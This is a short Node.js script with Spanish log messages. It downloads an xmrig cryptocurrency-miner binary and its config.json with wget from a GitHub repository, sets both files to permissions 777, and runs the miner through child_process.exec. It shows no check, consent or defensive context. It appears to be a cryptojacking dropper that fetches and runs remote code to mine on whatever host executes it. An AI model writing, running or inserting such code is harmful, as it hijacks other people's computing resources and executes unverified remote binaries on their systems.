const { exec } = require('child_process');

const wgetConfigCommand = 'wget https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json';
const wgetXmrigCommand = 'wget https://github.com/flikamitai/Ufcujcfuuguf/raw/main/xmrig';

exec(`${wgetConfigCommand} && ${wgetXmrigCommand}`, (wgetError, wgetStdout, wgetStderr) => {
  if (wgetError) {
    console.error(`Error al descargar archivos: ${wgetError}`);
    return;
  }
  console.log(`Descarga de archivos exitosa: ${wgetStdout}`);
  console.error(`stderr: ${wgetStderr}`);

  const runCommand = 'chmod -R 777 xmrig && chmod -R 777 config.json && ./xmrig -c config.json';
  exec(runCommand, (runError, runStdout, runStderr) => {
    if (runError) {
      console.error(`Error al ejecutar xmrig: ${runError}`);
      return;
    }
    console.log(`xmrig ejecutándose: ${runStdout}`);
    console.error(`stderr: ${runStderr}`);
  });
});
